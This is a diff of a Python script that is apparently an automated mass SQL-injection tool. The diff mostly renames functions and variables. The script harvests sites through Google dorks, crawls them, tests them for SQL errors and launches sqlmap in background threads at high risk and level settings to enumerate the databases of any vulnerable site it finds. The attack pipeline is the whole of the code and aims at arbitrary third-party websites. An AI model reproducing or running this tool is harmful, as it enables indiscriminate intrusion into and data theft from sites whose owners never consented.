@@ -1,20 +1,23 @@
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchWindowException
-from random import randint
-from urllib import request
-from selenium.common.exceptions import WebDriverException
-from selenium.common.exceptions import TimeoutException
-from selenium.common.exceptions import NoSuchElementException
-from selenium.common.exceptions import UnexpectedAlertPresentException
-from selenium.common.exceptions import InvalidArgumentException
-
 import time
 import sys
-import _thread
 import os
 import re
+from random import randint
+from urllib import request
+
+#from selenium.common.exceptions import WebDriverException
+from selenium.common.exceptions import TimeoutException
+#from selenium.common.exceptions import NoSuchElementException
+#from selenium.common.exceptions import UnexpectedAlertPresentException
+#from selenium.common.exceptions import InvalidArgumentException
+
+from selenium import webdriver
+#from selenium.webdriver.chrome.options import Options
+#from selenium.webdriver.common.by import By
+from selenium.common.exceptions import NoSuchWindowException
+import _thread
+
+
 
 # DO NOT CHANGE THIS
 false = 0
@@ -73,9 +76,9 @@ def getDomainName(link):
 def valid(link):
     if(link[-1] == '/'):
         link = link[:-1]
-    banned_keywords = getSites(banned_keywords_file, banned_keywords_file_lock)
-    queue = getSites(priority_file, priority_file_lock) + \
-        getSites(error_file, error_file_lock)
+    banned_keywords = get_sites(banned_keywords_file, banned_keywords_file_lock)
+    queue = get_sites(priority_file, priority_file_lock) + \
+        get_sites(error_file, error_file_lock)
     bannedExt = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
     # print(link+'\n')
     for ext in bannedExt:
@@ -144,8 +147,8 @@ def filterListOfRecursive(liste):
     return result
 
 
-def getRecursiveUrls(link, recuriveSearch):
-    if(recuriveSearch == 0):
+def getRecursiveUrls(link, recurive_search):
+    if(recurive_search == 0):
         return []
     # if(browser==0):
     #	browser = webdriver.Firefox()
@@ -183,16 +186,16 @@ def getRecursiveUrls(link, recuriveSearch):
     # urlsFiltered=[i for i in urlsFiltered if]
 
     print("extracted %s filtred %s" % (str(len(urls)), str(len(urlsFiltered))))
-    appendSitesOnFile(urlsFiltered, sites_file, sites_file_lock)
+    append_sitesOnFile(urlsFiltered, sites_file, sites_file_lock)
 
     for url in urlsFiltered:
-        getRecursiveUrls(url, recuriveSearch - 1)
+        getRecursiveUrls(url, recurive_search - 1)
 
     #result = list( dict.fromkeys(result) )
     # return result
 
 
-def extractSites(query):
+def extract_sites(query):
     page = 0
     results = 1
     liste = []
@@ -245,8 +248,8 @@ def extractSites(query):
             page += 10
 
     print("%s sites extracted \n" % str(len(liste)))
-    appendSitesOnFile(liste, sites_file, sites_file_lock)
-    appendSitesOnFile(liste, recursive_sites_file, recursive_sites_file_lock)
+    append_sitesOnFile(liste, sites_file, sites_file_lock)
+    append_sitesOnFile(liste, recursive_sites_file, recursive_sites_file_lock)
     browser.close()
 
 
@@ -305,21 +308,21 @@ def testSite(site):
     return False
 
 
-def testSites(sites_file_lock):
+def test_sites(sites_file_lock):
 
     lSql = []
     lError = []
     i = 0
 
-    sitesNum = getNumber(sites_file, sites_file_lock)
+    sitesNum = get_number(sites_file, sites_file_lock)
 
     while(sitesNum == 0):
         print(yellow_font + "Waiting for vulnerable sites to come\n" + end_font)
         time.sleep(60)
-        sitesNum = getNumber(sites_file, sites_file_lock)
+        sitesNum = get_number(sites_file, sites_file_lock)
 
     while(sitesNum > 0):
-        site = getSite(sites_file, sites_file_lock)
+        site = get_site(sites_file, sites_file_lock)
         if(site[len(site) - 1] == '/'):
             site = site[0:len(site) - 1]
         i += 1
@@ -341,25 +344,25 @@ def testSites(sites_file_lock):
                 print(yellow_font + "maybe" + end_font)
                 lError.append(site)
                 appendSiteOnFile(site + "\n", error_file, error_file_lock)
-        sitesNum = getNumber(sites_file, sites_file_lock)
+        sitesNum = get_number(sites_file, sites_file_lock)
         while(sitesNum == 0):
             print(
                 yellow_font +
                 "Waiting for vulnerable sites to come\n" +
                 end_font)
             time.sleep(60)
-            sitesNum = getNumber(sites_file, sites_file_lock)
+            sitesNum = get_number(sites_file, sites_file_lock)
 
     return (lSql, lError)
 
 
-def getSitesByDork(dork):
+def get_sitesByDork(dork):
     dork = dork.replace('&', '%26')
     dork = dork.replace(' ', '+')
-    extractSites(dork)
+    extract_sites(dork)
 
 
-def appendSitesOnFile(l, file, lock):
+def append_sitesOnFile(l, file, lock):
 
     while(lock):
         print("Waiting for %s To be unlocked" % (file))
@@ -464,7 +467,7 @@ def filter():
             if not found:
                 os.remove("finished/" + file)
                 print("\n")
-                listOfRemoved = getSites(banning_file, banning_file_lock)
+                listOfRemoved = get_sites(banning_file, banning_file_lock)
 
                 if(testIfBan(listOfRemoved, file[:-7] + "\n", banning_file_lock)):
                     appendSiteOnFile(file[:-7] + "\n",
@@ -494,7 +497,7 @@ def filter():
             f.close()
 
 
-def getSite(fileName, lock):
+def get_site(fileName, lock):
 
     while(lock):
         print("waiting for %s To be Unlocked" % (fileName))
@@ -521,7 +524,7 @@ def getSite(fileName, lock):
     return site
 
 
-def getSites(fileName, lock):
+def get_sites(fileName, lock):
 
     while(lock):
         print("waiting for %s To be Unlocked" % (fileName))
@@ -533,7 +536,7 @@ def getSites(fileName, lock):
     return sites
 
 
-def getNumber(fileName, lock):
+def get_number(fileName, lock):
 
     while(lock):
         print("waiting for %d To be Unlocked" % (fileName))
@@ -549,27 +552,27 @@ def getNumber(fileName, lock):
     return len(sites)
 
 
-def exploit(maxthreads):
+def exploit(max_threads):
 
-    priority_fileNumber = getNumber(priority_file, priority_file_lock)
+    priority_file_number = get_number(priority_file, priority_file_lock)
 
-    error_fileNumber = getNumber(error_file, error_file_lock)
+    error_file_number = get_number(error_file, error_file_lock)
 
     os.system("mkdir working")
     os.system("mkdir finished")
     os.system("mkdir dbs")
     os.system("mkdir maybe")
-    while(priority_fileNumber == 0 and error_fileNumber == 0):
+    while(priority_file_number == 0 and error_file_number == 0):
         print(green_font + "Waiting for sites to come\n" + end_font)
         time.sleep(60)
 
-        priority_fileNumber = getNumber(priority_file, priority_file_lock)
+        priority_file_number = get_number(priority_file, priority_file_lock)
 
-        error_fileNumber = getNumber(error_file, error_file_lock)
+        error_file_number = get_number(error_file, error_file_lock)
 
-    while priority_fileNumber > 0 or error_fileNumber > 0:
+    while priority_file_number > 0 or error_file_number > 0:
 
-        while(getSqlMapThreads() > maxthreads):
+        while(get_sqlmap_threads() > max_threads):
             print(
                 green_font +
                 "Waiting for others to finish exploit\n" +
@@ -578,21 +581,21 @@ def exploit(maxthreads):
 
         else:
 
-            if(priority_fileNumber > 0):
-                site = getSite(priority_file, priority_file_lock)
+            if(priority_file_number > 0):
+                site = get_site(priority_file, priority_file_lock)
 
             else:
-                site = getSite(error_file, error_file_lock)
+                site = get_site(error_file, error_file_lock)
 
-            priority_fileNumber = getNumber(priority_file, priority_file_lock)
+            priority_file_number = get_number(priority_file, priority_file_lock)
 
-            error_fileNumber = getNumber(error_file, error_file_lock)
+            error_file_number = get_number(error_file, error_file_lock)
 
             if(site[len(site) - 1] == '\n'):
                 site = site[0:len(site) - 1]
             siteFile = getDomainName(site)
-            randomInt1 = randint(0, 9)
-            randomInt2 = randint(0, 9)
+            random_int1 = randint(0, 9)
+            random_int2 = randint(0, 9)
             print(
                 green_font +
                 "executing exploit for " +
@@ -600,28 +603,28 @@ def exploit(maxthreads):
                 "\n" +
                 end_font)
             command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,
-                                                                                                                                                                                                                     siteFile, str(randomInt1) + str(randomInt2), sqlMapPath + "/sqlmap/", site, siteFile, str(randomInt1) + str(randomInt2), siteFile, str(randomInt1) + str(randomInt2), siteFile, str(randomInt1) + str(randomInt2))
+                                                                                                                                                                                                                     siteFile, str(random_int1) + str(random_int2), sqlMapPath + "/sqlmap/", site, siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2))
             os.system(command)
-            while(priority_fileNumber == 0 and error_fileNumber == 0):
+            while(priority_file_number == 0 and error_file_number == 0):
                 print(green_font + "Waiting for sites to come\n" + end_font)
                 time.sleep(50)
 
-                priority_fileNumber = getNumber(
+                priority_file_number = get_number(
                     priority_file, priority_file_lock)
 
-                error_fileNumber = getNumber(error_file, error_file_lock)
+                error_file_number = get_number(error_file, error_file_lock)
 
     else:
         print(green_font + "no sites to test" + end_font)
 
 
-def all(maxThreads, recursiveSearchNumber):
+def all(max_threads, recursive_search_number):
 
     _thread.start_new_thread(gets, ())
-    _thread.start_new_thread(testSites, (sites_file_lock,))
-    _thread.start_new_thread(exploit, (maxThreads,))
-    if(recursiveSearchNumber > 0):
-        _thread.start_new_thread(recursiveSearch, (recursiveSearchNumber,))
+    _thread.start_new_thread(test_sites, (sites_file_lock,))
+    _thread.start_new_thread(exploit, (max_threads,))
+    if(recursive_search_number > 0):
+        _thread.start_new_thread(recursive_search, (recursive_search_number,))
 
     while True:
         pass
@@ -629,19 +632,19 @@ def all(maxThreads, recursiveSearchNumber):
 
 def gets():
     print(blue_font)
-    dorksNumber = getNumber(dork_list_file, dork_list_file_lock)
-    while dorksNumber == 0:
+    dorks_number = get_number(dork_list_file, dork_list_file_lock)
+    while dorks_number == 0:
         print(blue_font + "Waiting for new dorks" + end_font)
         time.sleep(60)
-        dorksNumber = getNumber(dork_list_file, dork_list_file_lock)
-    while(dorksNumber > 0):
-        dork = getSite(dork_list_file, dork_list_file_lock)
-        getSitesByDork(dork)
-        dorksNumber = getNumber(dork_list_file, dork_list_file_lock)
-        while dorksNumber == 0:
+        dorks_number = get_number(dork_list_file, dork_list_file_lock)
+    while(dorks_number > 0):
+        dork = get_site(dork_list_file, dork_list_file_lock)
+        get_sitesByDork(dork)
+        dorks_number = get_number(dork_list_file, dork_list_file_lock)
+        while dorks_number == 0:
             print(blue_font + "Waiting for new dorks" + end_font)
             time.sleep(60)
-            dorksNumber = getNumber(dork_list_file, dork_list_file_lock)
+            dorks_number = get_number(dork_list_file, dork_list_file_lock)
 
     print("End get dorks")
 
@@ -675,7 +678,7 @@ def setup():
 
     os.system("echo \"alias clean='python3 clean.py'\" >> ~/.bashrc ")
     os.system(
-        "echo \"alias filter='zeb ; python3 extractSites.py filter'\" >> ~/.bashrc ")
+        "echo \"alias filter='zeb ; python3 extract_sites.py filter'\" >> ~/.bashrc ")
     os.system("echo \"alias lss='ls -lia'\" >> ~/.bashrc ")
     os.system("echo \"alias revnc='vncserver -kill :1 ; vncserver'\" >> ~/.bashrc ")
     os.system("echo \"alias sites='ps aux | grep sqlmap | sed -E \'/sh -c/d\' | sed -E \'/grep/d\' '\" >> ~/.bashrc ")
@@ -703,54 +706,54 @@ def setup():
     #os.system("echo \"google.\" > "+banned_keywords_file)
 
 
-def recursiveSearch(number):
+def recursive_search(number):
 
-    print("recuriveSearch")
-    readyToCheckNumber = getNumber(sites_file, sites_file_lock)
-    sitesNumber = getNumber(recursive_sites_file, recursive_sites_file_lock)
-    while sitesNumber == 0:
-        print("Waiting for new sites for recursiveSearch")
+    print("recurive_search")
+    ready_to_check_number = get_number(sites_file, sites_file_lock)
+    sites_number = get_number(recursive_sites_file, recursive_sites_file_lock)
+    while sites_number == 0:
+        print("Waiting for new sites for recursive_search")
         time.sleep(60)
-        sitesNumber = getNumber(
+        sites_number = get_number(
             recursive_sites_file,
             recursive_sites_file_lock)
-    while readyToCheckNumber > 1000:
-        print("proirity to readyToCheckSites")
+    while ready_to_check_number > 1000:
+        print("proirity to readyToCheck_sites")
         time.sleep(60)
-        readyToCheckNumber = getNumber(sites_file, sites_file_lock)
+        ready_to_check_number = get_number(sites_file, sites_file_lock)
     #recursiveBrowser = webdriver.Firefox()
-    while(sitesNumber > 0):
+    while(sites_number > 0):
 
-        link = getSite(recursive_sites_file, recursive_sites_file_lock)
+        link = get_site(recursive_sites_file, recursive_sites_file_lock)
 
-        #print("recuriveSearch for "+link)
+        #print("recurive_search for "+link)
         # newListe=
         getRecursiveUrls(link, number)
 
-        readyToCheckNumber = getNumber(sites_file, sites_file_lock)
-        sitesNumber = getNumber(
+        ready_to_check_number = get_number(sites_file, sites_file_lock)
+        sites_number = get_number(
             recursive_sites_file,
             recursive_sites_file_lock)
 
-        # if(sitesNumber==0):
+        # if(sites_number==0):
         # recursiveBrowser.close()
-        while sitesNumber == 0:
-            print("Waiting for new sites for recursiveSearch")
+        while sites_number == 0:
+            print("Waiting for new sites for recursive_search")
             time.sleep(60)
-            sitesNumber = getNumber(
+            sites_number = get_number(
                 recursive_sites_file,
                 recursive_sites_file_lock)
-        while readyToCheckNumber > 1000:
-            print("proirity to readyToCheckSites")
+        while ready_to_check_number > 1000:
+            print("proirity to readyToCheck_sites")
             time.sleep(60)
-            readyToCheckNumber = getNumber(sites_file, sites_file_lock)
+            ready_to_check_number = get_number(sites_file, sites_file_lock)
         #recursiveBrowser = webdriver.Firefox()
 
-    print("end recuriveSearch")
+    print("end recurive_search")
     # recursiveBrowser.close()
 
 
-def getSqlMapThreads():
+def get_sqlmap_threads():
     return int(int(os.popen(
         "ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))
 
@@ -758,19 +761,19 @@ def getSqlMapThreads():
 def main():
 
     if(len(sys.argv) == 4 and sys.argv[1] == "get"):
-        getSitesByDork(sys.argv[2])
+        get_sitesByDork(sys.argv[2])
         if(int(sys.argv[3]) > 0):
-            recursiveSearch(int(sys.argv[3]))
-        testSites(sites_file_lock)
+            recursive_search(int(sys.argv[3]))
+        test_sites(sites_file_lock)
 
     elif(len(sys.argv) == 3 and sys.argv[1] == "exploit"):
-        maxThreads = int(sys.argv[2])
-        exploit(maxThreads)
+        max_threads = int(sys.argv[2])
+        exploit(max_threads)
 
     elif(len(sys.argv) == 2 and sys.argv[1] == "filter"):
         filter()
-    elif(len(sys.argv) == 3 and sys.argv[1] == "recursiveSearch"):
-        recursiveSearch(int(sys.argv[2]))
+    elif(len(sys.argv) == 3 and sys.argv[1] == "recursive_search"):
+        recursive_search(int(sys.argv[2]))
     elif(len(sys.argv) == 2 and sys.argv[1] == "setup"):
         setup()
     elif(len(sys.argv) == 2 and sys.argv[1] == "clean"):
@@ -778,18 +781,18 @@ def main():
     elif(len(sys.argv) == 3 and sys.argv[1] == "gets"):
         gets()
         if(int(sys.argv[3]) > 0):
-            recursiveSearch(int(sys.argv[3]))
+            recursive_search(int(sys.argv[3]))
     elif(len(sys.argv) == 4 and sys.argv[1] == "all"):
         all(int(sys.argv[2]), int(sys.argv[3]))
     else:
-        print("usage : " + sys.argv[0] + " get dork recursiveSearch\n")
-        print("usage : " + sys.argv[0] + " gets recursiveSearch\n")
-        print("usage : " + sys.argv[0] + " exploit maxthreads\n")
+        print("usage : " + sys.argv[0] + " get dork recursive_search\n")
+        print("usage : " + sys.argv[0] + " gets recursive_search\n")
+        print("usage : " + sys.argv[0] + " exploit max_threads\n")
         print("usage : " + sys.argv[0] + " filter\n")
 
-        print("usage : " + sys.argv[0] + " recursiveSearch int\n")
+        print("usage : " + sys.argv[0] + " recursive_search int\n")
         print("usage : " + sys.argv[0] + " setup\n")
-        print("usage : " + sys.argv[0] + " all maxthreads recursiveSearch\n")
+        print("usage : " + sys.argv[0] + " all max_threads recursive_search\n")
 
 
 main()
